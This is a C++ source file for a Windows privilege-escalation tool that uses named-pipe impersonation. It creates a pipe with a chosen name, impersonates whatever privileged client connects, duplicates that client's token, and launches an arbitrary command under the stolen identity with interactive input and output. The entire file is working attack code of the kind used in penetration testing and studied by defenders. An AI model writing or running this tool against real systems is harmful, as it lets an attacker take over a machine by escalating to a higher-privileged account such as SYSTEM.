#include <iostream>
#include <string>
#include <Windows.h>
#include <sddl.h>

#define BUFSIZE 1024

void ReadFromPipe(HANDLE StdOutRead)
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    // stdout of parent process
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    while (true)
    {
        // read from pipe
        bSuccess = ReadFile(StdOutRead, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;
        // write to stdout of parent process 
        bSuccess = WriteFile(hParentStdOut, chBuf,
            dwRead, &dwWritten, NULL);
        if (!bSuccess) break;
    }
}

void WriteToPipe(HANDLE StdInWrite)
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    // stdin of parent process
    HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);
    while (true)
    {
        // read from stdin of parent process
        bSuccess = ReadFile(hParentStdIn, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;
        // write to pipe
        bSuccess = WriteFile(StdInWrite, chBuf, dwRead, &dwWritten, NULL);
        if (!bSuccess) break;
    }
}

BOOL CreateImpersonatedProcess(LPCWSTR lpPipeName, LPWSTR lpCmdline) {
    HANDLE hPipe = NULL;
    BOOL bStatus = NULL;
    HANDLE hToken = NULL;
    DWORD dwLength = NULL;
    PTOKEN_USER pTokenUser = {};
    LPSTR lpSid = NULL;
    HANDLE hSystemToken = NULL;
    HANDLE StdInRead = NULL;
    HANDLE StdInWrite = NULL;
    HANDLE StdOutRead = NULL;
    HANDLE StdOutWrite = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    SECURITY_ATTRIBUTES	sa = { 0 };

    RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlZeroMemory(&si, sizeof(STARTUPINFO));
    RtlZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));

    // create named pipe with supplied name
    hPipe = CreateNamedPipeW(lpPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 100, BUFSIZE, BUFSIZE, 0, NULL);
    if (hPipe == NULL) {
        printf("[-] CreateNamedPipe failed with error : %d\n", GetLastError());
        return -1;
    }
    printf("[+] named pipe created : %ls\n", lpPipeName);
    printf("[i] waiting for connection...\n");
    bStatus = ConnectNamedPipe(hPipe, NULL);
    if (!bStatus) {
        printf("[-] ConnectNamedPipe failed with error : %d\n", GetLastError());
        return -1;
    }
    // once connected, perform impersonation
    bStatus = ImpersonateNamedPipeClient(hPipe);
    if (!bStatus) {
        printf("[-] ImpersonateNamedPipeClient failed with error : %d\n", GetLastError());
        return -1;
    }
    printf("[+] connected\n");
    // get token handle
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
    if (hToken == NULL) {
        printf("[-] OpenThreadToken failed with error : %d\n", GetLastError());
        return -1;
    }

    // get size of token
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwLength);
    // get user information of token
    GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength);
    bStatus = ConvertSidToStringSidA(pTokenUser->User.Sid, &lpSid);
    if (!bStatus) {
        printf("[-] ConvertSidToStringSid failed with error : %d\n", GetLastError());
        return -1;
    }
    printf("[+] sid : %s\n", lpSid);

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Initialize Anonymous Input Pipe
    if (!CreatePipe(&StdInRead, &StdInWrite, &sa, 0)) {
        printf("[!] CreatePipe(1) failed with error: %d\n", GetLastError());
        return FALSE;
    }
    // Initialize Anonymous Output Pipe
    if (!CreatePipe(&StdOutRead, &StdOutWrite, &sa, 0)) {
        printf("[!] CreatePipe(2) failed with error: %d\n", GetLastError());
        return FALSE;
    }
    if (!SetHandleInformation(StdInWrite, HANDLE_FLAG_INHERIT, 0)) {
        printf("[!] SetHandleInformation(1) failed with error: %d\n", GetLastError());
        return FALSE;
    }
    if (!SetHandleInformation(StdOutRead, HANDLE_FLAG_INHERIT, 0)) {
        printf("[!] SetHandleInformation(2) failed with error: %d\n", GetLastError());
        return FALSE;
    }

    // copy impersonated token
    bStatus = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hSystemToken);
    if (!bStatus) {
        printf("[-] DuplicateTokenEx failed with error : %d\n", GetLastError());
        return FALSE;
    }
    printf("[i] executing command : %ls\n", lpCmdline);

    si.cb = sizeof(STARTUPINFO);
    si.dwFlags |= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    si.wShowWindow = SW_HIDE;
    si.hStdInput = StdInRead;
    si.hStdOutput = si.hStdError = StdOutWrite;

    // create process with impersonated token
    bStatus = CreateProcessWithTokenW(hSystemToken, 0, NULL, lpCmdline, 0, NULL, NULL, &si, &pi);
    if (!bStatus) {
        printf("[-] CreateProcessWithTokenW failed with error : %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] process created : %d\n", pi.dwProcessId);
    // close unnecessary handles to avoid blocking I/O
    CloseHandle(StdInRead);
    CloseHandle(StdOutWrite);
    StdInRead = StdOutWrite = NULL;
    // start thread for output
    HANDLE hOutThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ReadFromPipe, StdOutRead, NULL, NULL);
    // start thread for input
    HANDLE hInThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)WriteToPipe, StdInWrite, NULL, NULL);
    WaitForMultipleObjects(1, &hOutThread, TRUE, INFINITE);
    WaitForMultipleObjects(1, &hInThread, TRUE, INFINITE);

    
    CloseHandle(StdInWrite);
    CloseHandle(StdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(hOutThread);
    CloseHandle(hInThread);
    return TRUE;
}



int wmain(int argc, wchar_t* argv[])
{
    LPCWSTR lpPipeName = NULL;
    LPWSTR lpCmdline = NULL;
    BOOL bResult = FALSE;
    
    if (argc < 3) {
        printf("[!] usage: %ls <pipename> <command>\n", argv[0]);
        return -1;
    }
    lpPipeName = argv[1];
    lpCmdline = argv[2];
    
    bResult = CreateImpersonatedProcess(lpPipeName, lpCmdline);
    if (!bResult) {
        return -1;
    }
    
    return 0;
}

